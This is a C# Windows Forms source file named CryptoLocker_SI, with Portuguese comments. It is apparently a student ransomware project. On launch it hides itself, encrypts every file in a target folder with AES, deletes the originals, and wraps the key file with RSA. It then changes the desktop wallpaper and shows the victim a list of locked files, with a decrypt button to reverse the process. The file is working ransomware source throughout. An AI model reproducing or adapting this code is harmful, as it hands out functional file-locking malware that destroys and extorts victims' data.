using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

namespace CryptoLocker_SI
{
    public partial class Form1 : Form
    {
        private static string folderPath = CryptoLocker_SI.Properties.Settings.Default.folderPath; //PASTA QUE CONTEM OS FICHEIROS A SEREM INCRIPTADOS
        private static string keyPath = CryptoLocker_SI.Properties.Settings.Default.keyPath;      //PASTA QUE IRÁ CONTER OS DADOS REFERENTES AOS FICHEIROS ENCRIPTADOS E RESPECTIVAS CHAVES QUE SERVIRÃO PARA DECRIPTAR

        //FICHEIROS TEMPORÁRIO USADOS
        private static string filesWithFilenameAndKeys = CryptoLocker_SI.Properties.Settings.Default.files;    //FICHEIRO QUE GUARDA A INFORMAÇÃO SOBRE AS CHAVES QUE DECIFRAM CADA FICHEIRO
        private static string encriptedKey = CryptoLocker_SI.Properties.Settings.Default.encriptedKey;    //CHAVE QUE ESTÁ INCRIPTADA COM RSA E SERVE PARA DECRIPTAR O FICHEIROS FILES.TXT 
        private static string masterKey = CryptoLocker_SI.Properties.Settings.Default.masterKey;    //CHAVE PRIVADA QUE SUPOSTAMENTE FICARÁ NO LADO DO SERVIDOR, SERVIRÁ PARA DESENCRIPTAR A CHAVA RSA
        private static string listFilesEncripted = CryptoLocker_SI.Properties.Settings.Default.listFilesEncripted;    //FICHEIRO QUE CONTÉM O CAMINHO/NOME DOS FICHEIROS PARA MOSTRAR NO FINAL AO UTILIZADOR.

        #region variaveis para mudar a imagem de fundo
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction,
            int uParam, string lpvParam, int fuWinIni);

        private static readonly int MAX_PATH = 260;
        private static readonly int SPI_GETDESKWALLPAPER = 0x73;
        private static readonly int SPI_SETDESKWALLPAPER = 0x14;
        private static readonly int SPIF_UPDATEINIFILE = 0x01;
        private static readonly int SPIF_SENDWININICHANGE = 0x02;
        #endregion

        byte[] key;
        byte[] iv;

        public Form1()
        {
            InitializeComponent();
        }


        private void encriptAllAESKeysFile()
        {
            string contents = File.ReadAllText(keyPath + filesWithFilenameAndKeys);
            encriptFileContent(contents, Path.GetFullPath(keyPath + filesWithFilenameAndKeys), false);

            #region Encriptar o ficheiro que contem as chaves do AES com RSA
            string encriptedKeyFile = File.ReadAllText(keyPath + encriptedKey);
            // obter dados (chave e iv AES)
            byte[] aesKey = Encoding.UTF8.GetBytes(encriptedKeyFile);
            //obter a chave publica RSA 
            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
            string publicKey = rsa.ToXmlString(false); //false = exportar apenas a chave publica
            string privateKey = rsa.ToXmlString(true);//true = exportar a chave publica e privada

            rsa.FromXmlString(publicKey);

            //cifrar com RSA
            byte[] dadosCifradosKey = rsa.Encrypt(aesKey, true);
            //guardar chave encriptada com o RSA
            System.IO.File.Delete(keyPath + encriptedKey);

            //guardar a key e iv
            using (StreamWriter sw = File.AppendText(keyPath + encriptedKey))
            {
                sw.WriteLine(System.Convert.ToBase64String(dadosCifradosKey));
            }
            //guardar a chave privada
            using (StreamWriter swm = File.AppendText(keyPath + masterKey))
            {
                swm.WriteLine(privateKey);
            }

            #endregion

        }

        private void encriptFileContent(string contents, string fullPath, Boolean flag)
        {
            AesCryptoServiceProvider aes = null;
            FileStream fsOutput = null;
            CryptoStream cs = null;
            FileStream fsInput = null;
            StreamWriter sw = null;
            StreamWriter swl = null;

            string directoryName = Path.GetDirectoryName(fullPath) + "\\" + Path.GetFileNameWithoutExtension(fullPath);

            try
            {
                aes = new AesCryptoServiceProvider();
                this.key = aes.Key;
                this.iv = aes.IV;

                string newFileName = directoryName + ".dat";
                if (Path.GetExtension(fullPath).Equals(".dat"))
                {
                    newFileName = directoryName + "_copy.dat";
                }
                using (fsOutput = new FileStream(newFileName, FileMode.Create))
                {
                    using (cs = new CryptoStream(fsOutput, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        using (fsInput = new FileStream(fullPath, FileMode.Open))
                        {
                            int data;
                            while ((data = fsInput.ReadByte()) != -1)
                            {
                                cs.WriteByte((byte)data);
                            }
                        }
                    }
                }

                if (flag)
                {
                    using (sw = File.AppendText(keyPath + filesWithFilenameAndKeys))
                    {
                        sw.WriteLine(System.Convert.ToBase64String(aes.Key));
                        sw.WriteLine(System.Convert.ToBase64String(aes.IV));
                        sw.WriteLine(Path.GetFullPath(fullPath));
                        using (swl = File.AppendText(keyPath + listFilesEncripted))
                        {
                            swl.WriteLine(Path.GetFullPath(fullPath));
                        }
                    }
                }
                else
                {
                    using (sw = File.AppendText(keyPath + encriptedKey)) //chave resulta do ficheiro files.txt
                    {
                        sw.WriteLine(System.Convert.ToBase64String(aes.Key));
                        sw.WriteLine(System.Convert.ToBase64String(aes.IV));
                    }
                }

                File.Delete(fullPath);
            }
            catch (Exception)
            {
                throw;
            }
            finally
            {
                if (aes != null)
                    aes.Dispose();
                if (fsOutput != null)
                    fsOutput.Dispose();
                if (cs != null)
                    cs.Dispose();
                if (fsInput != null)
                    fsInput.Dispose();
                if (sw != null)
                    sw.Dispose();
                if (swl != null)
                    swl.Dispose();
            }
        }

        private void btnDecript_Click(object sender, EventArgs e)
        {
            btnDecript.Enabled = false;
            decriptRSAKeysFile();
            string extension = ".dat";
            //obter dados cifrados dos ficheiros
            string[] files = File.ReadAllLines(keyPath + filesWithFilenameAndKeys);
            for (int i = 0; i < files.Length; i += 3)
            {
                if (Path.GetExtension(files[i + 2]).Equals(extension))
                {
                    extension = "_copy.dat";
                }
                byte[] contents = File.ReadAllBytes(Path.GetDirectoryName(files[i + 2]) + "\\" + Path.GetFileNameWithoutExtension(files[i + 2]) + extension);
                decriptFileContent(files[i], files[i + 1], files[i + 2], true);
            }
            MessageBox.Show("Desencriptado com Sucesso!!");
            Application.Exit();
        }

        private void decriptRSAKeysFile()
        {
            StreamWriter sw = null;
            RSACryptoServiceProvider rsa = null;
            try
            {
                //decriptar encriptedKey.txt com RSA que está no ficheiro masterKey.txt   
                string encriptedKeyFile = File.ReadAllText(keyPath + encriptedKey);

                // obter dados a decifrar (chave secreta cifrada com a chave publica)
                byte[] aesKey = Convert.FromBase64String(encriptedKeyFile);

                // importar a chave privada (correspondente à publica que cifrou)
                rsa = new RSACryptoServiceProvider();
                //ler masterKey
                string privateKey = File.ReadAllText(keyPath + masterKey);
                rsa.FromXmlString(privateKey);

                // decifrar (e obter a chave secreta)
                byte[] dAesKey = rsa.Decrypt(aesKey, true); // padding = OAEP

                File.Delete(keyPath + encriptedKey);

                //guardar a chave privada
                using (sw = File.AppendText(keyPath + encriptedKey))
                {
                    sw.WriteLine(Encoding.UTF8.GetString(dAesKey));
                }
                string[] fileDecripted = File.ReadAllLines(keyPath + encriptedKey);
                decriptFileContent(fileDecripted[0], fileDecripted[1], Path.GetFullPath(keyPath + filesWithFilenameAndKeys), false);
            }
            catch (Exception)
            {

                throw;
            }
            finally
            {
                if (rsa != null)
                    rsa.Dispose();
                if (sw != null)
                    sw.Dispose();
            }
        }

        private void decriptFileContent(string fileKey, string fileIv, string fullPath, Boolean flag)
        {
            AesCryptoServiceProvider aes = null;
            FileStream fsInput = null;
            CryptoStream cs = null;
            FileStream fsOutput = null;


            try
            {
                //Configuração (ler a chave)
                aes = new AesCryptoServiceProvider();

                aes.Key = System.Convert.FromBase64String(fileKey);
                aes.IV = System.Convert.FromBase64String(fileIv);

                string encriptedFile = Path.GetDirectoryName(fullPath) + "\\" + Path.GetFileNameWithoutExtension(fullPath) + ".dat";

                if (Path.GetExtension(fullPath).Equals(".dat"))
                {
                    encriptedFile = Path.GetDirectoryName(fullPath) + "\\" + Path.GetFileNameWithoutExtension(fullPath) + "_copy.dat";
                }

                using (fsInput = new FileStream(encriptedFile, FileMode.Open))
                {
                    using (cs = new CryptoStream(fsInput, aes.CreateDecryptor(), CryptoStreamMode.Read))
                    {
                        using (fsOutput = new FileStream(Path.GetDirectoryName(fullPath) + "\\" + Path.GetFileNameWithoutExtension(fullPath) + Path.GetExtension(fullPath), FileMode.Create))
                        {
                            int data;
                            while ((data = cs.ReadByte()) != -1)
                            {
                                fsOutput.WriteByte((byte)data);
                            }
                        }
                    }
                }

                File.Delete(encriptedFile);
                if (flag)
                {
                    foreach (string file in Directory.EnumerateFiles(keyPath, "*.*", SearchOption.AllDirectories))   // O.o TEMOS QUE VERIFICAR SÓ PARA ACEITAR AS EXTENÇOES QUE PRETENDEMOS
                    {
                        File.Delete(file);
                    }
                }

            }
            catch (Exception)
            {
                throw;
            }
            finally
            {
                if (aes != null)
                    aes.Dispose();
                if (fsInput != null)
                    fsInput.Dispose();
                if (cs != null)
                    cs.Dispose();
                if (fsOutput != null)
                    fsOutput.Dispose();
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
            //this.WindowState = FormWindowState.Minimized;
            Visible = false; // Hide form window.
            ShowInTaskbar = false; // Remove from taskbar.

            string contents;

            if (!Directory.Exists(folderPath) || !Directory.Exists(keyPath))
            {
                Directory.CreateDirectory(folderPath);
                Directory.CreateDirectory(keyPath);
            }

            int fileCount = Directory.GetFiles(folderPath).Length;
            if (fileCount != 0)
            {
                foreach (string file in Directory.EnumerateFiles(folderPath, "*.*", SearchOption.AllDirectories))   // O.o TEMOS QUE VERIFICAR SÓ PARA ACEITAR AS EXTENÇOES QUE PRETENDEMOS
                {

                    contents = File.ReadAllText(file);
                    encriptFileContent(contents, file, true); //true = encriptar ficheiros
                    //delete file original
                    File.Delete(file);
                }

                //encriptar as chaves AES com publica RSA
                encriptAllAESKeysFile();

                //quando acabar de encriptar tudo
                SetDesktopWallpaper(Path.GetFullPath(@"wallpaper.jpg"));
                MostrarFicheirosIncriptados();
                Visible = true;

            }
            else
            {
                //btnDecript.Enabled = false;
                Application.Exit();
            }

        }



        private void MostrarFicheirosIncriptados()
        {
            string[] encriptedKeyFile = File.ReadAllLines(keyPath + listFilesEncripted);

            for (int i = 0; i < encriptedKeyFile.Length; i++)
            {
                lstFilesEncryted.Items.Add(encriptedKeyFile[i]);
            }
        }

        //change desktop wallpaper
        static string GetDesktopWallpaper()
        {
            string wallpaper = new string('\0', MAX_PATH);
            SystemParametersInfo(SPI_GETDESKWALLPAPER, (int)wallpaper.Length, wallpaper, 0);
            return wallpaper.Substring(0, wallpaper.IndexOf('\0'));
        }

        static void SetDesktopWallpaper(string filename)
        {
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, filename,
                SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
    }
}
